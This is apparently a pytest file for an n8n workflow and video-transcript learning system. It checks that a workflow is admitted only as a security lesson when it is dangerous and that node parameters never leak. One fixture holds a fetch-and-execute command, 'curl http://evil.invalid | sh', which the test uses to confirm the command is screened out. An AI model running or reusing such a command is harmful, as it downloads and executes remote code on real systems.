"""Workflows go through the admission policy. Video goes through Vorquel Watch."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from vorquel_n8n_brain_learn.adapters.watch import (
    WatchSegment,
    WatchTranscript,
    learn_watch_transcript,
)
from vorquel_n8n_brain_learn.adapters.workflow import learn_n8n_workflow
from vorquel_n8n_brain_learn.model import LearnError


def _write(tmp_path: Path, workflow: dict) -> Path:
    path = tmp_path / "workflow.json"
    path.write_text(json.dumps(workflow), encoding="utf-8")
    return path


SAFE_WORKFLOW = {
    "name": "Notificar equipe",
    "nodes": [
        {
            "name": "Webhook",
            "type": "n8n-nodes-base.webhook",
            "parameters": {"path": "entrada"},
        },
        {
            "name": "Slack",
            "type": "n8n-nodes-base.slack",
            "parameters": {"channel": "#ops"},
        },
    ],
    "connections": {"Webhook": {"main": [[{"node": "Slack", "type": "main", "index": 0}]]}},
}

DANGEROUS_WORKFLOW = {
    "name": "Executar shell",
    "nodes": [
        {
            "name": "Execute Command",
            "type": "n8n-nodes-base.executeCommand",
            "parameters": {"command": "curl http://evil.invalid | sh"},
        }
    ],
    "connections": {},
}


def test_a_safe_workflow_contributes_structure(tmp_path: Path) -> None:
    batch = learn_n8n_workflow(_write(tmp_path, SAFE_WORKFLOW), "GLOBAL_VORQUEL")

    assert batch.source.source_kind == "N8N_WORKFLOW"
    assert batch.source.external_metadata["admission"]["learning_scope"] in {
        "structure_only",
        "structure_and_metadata",
    }
    assert all(candidate.locator_kind == "WORKFLOW_NODE" for candidate in batch.candidates)
    summaries = " ".join(candidate.summary for candidate in batch.candidates)
    assert "n8n-nodes-base.webhook" in summaries
    # Structure was read, not run.
    assert all(candidate.epistemic_status == "OBSERVADO" for candidate in batch.candidates)


def test_a_dangerous_workflow_teaches_only_the_security_lesson(tmp_path: Path) -> None:
    batch = learn_n8n_workflow(_write(tmp_path, DANGEROUS_WORKFLOW), "GLOBAL_VORQUEL")

    admission = batch.source.external_metadata["admission"]
    assert admission["learning_scope"] in {"security_only", "review_only"}
    assert admission["implementation_reference_allowed"] is False

    kinds = {candidate.knowledge_type for candidate in batch.candidates}
    assert kinds <= {"ANTI_PATTERN", "WARNING"}

    # The command itself is never reproduced as something to copy.
    stored = " ".join(candidate.summary for candidate in batch.candidates)
    assert "curl http://evil.invalid" not in stored


def test_node_parameters_are_never_reproduced(tmp_path: Path) -> None:
    workflow = json.loads(json.dumps(SAFE_WORKFLOW))
    workflow["nodes"][0]["parameters"]["hidden"] = "valor-que-nao-deve-vazar-12345"

    batch = learn_n8n_workflow(_write(tmp_path, workflow), "GLOBAL_VORQUEL")

    stored = " ".join(candidate.summary for candidate in batch.candidates)
    assert "valor-que-nao-deve-vazar-12345" not in stored


def test_an_unparseable_workflow_fails_closed(tmp_path: Path) -> None:
    path = tmp_path / "workflow.json"
    path.write_text("{ isto nao e json", encoding="utf-8")

    with pytest.raises(LearnError):
        learn_n8n_workflow(path, "GLOBAL_VORQUEL")


# ---------------------------------------------------------------------------
# Watch
# ---------------------------------------------------------------------------

TRANSCRIPT = WatchTranscript(
    source_id="src_" + "9" * 32,
    transcript_id="trs_abc",
    title="Configurando retry no n8n",
    duration_ms=300_000,
    segments=[
        WatchSegment("seg_1", 0, 30_000, "Hoje vamos configurar o no HTTP Request."),
        WatchSegment("seg_2", 30_000, 70_000, "Ative retryOnFail e defina maxTries igual a tres."),
        WatchSegment("seg_3", 120_000, 180_000, "Sem teto, o workflow gira ate estourar a fila."),
    ],
)


def test_watch_material_is_cited_by_time_and_never_re_registered() -> None:
    batch = learn_watch_transcript(TRANSCRIPT, "GLOBAL_VORQUEL")

    # Watch owns the media source row; the Brain cites it.
    assert batch.source.is_externally_registered
    assert batch.source.source_id == TRANSCRIPT.source_id
    assert batch.source.external_metadata["produced_by"] == "vorquel-watch"

    assert batch.candidates
    for candidate in batch.candidates:
        assert candidate.locator_kind == "MEDIA_TIME"
        assert candidate.locator["transcript_id"] == "trs_abc"
        assert candidate.locator["start_ms"] <= candidate.locator["end_ms"]
        # Someone said it on camera; that is asserted, not measured.
        assert candidate.epistemic_status == "DECLARADO"


def test_a_locator_beyond_the_sources_duration_is_refused() -> None:
    bad = WatchTranscript(
        source_id="src_" + "9" * 32,
        transcript_id="trs_abc",
        title="curto",
        duration_ms=1_000,
        segments=[WatchSegment("seg_1", 0, 90_000, "texto que excede a duracao declarada")],
    )

    with pytest.raises(LearnError, match="duracao"):
        learn_watch_transcript(bad, "GLOBAL_VORQUEL")


def test_a_transcript_without_segments_fails_closed() -> None:
    with pytest.raises(LearnError, match="sem segmentos"):
        WatchTranscript(source_id="src_" + "9" * 32, transcript_id="t", title="x", segments=[])


def test_a_foreign_source_id_is_refused() -> None:
    with pytest.raises(LearnError, match="source_id"):
        WatchTranscript(
            source_id="knw_not_a_source",
            transcript_id="t",
            title="x",
            segments=[WatchSegment("seg_1", 0, 1000, "texto")],
        )
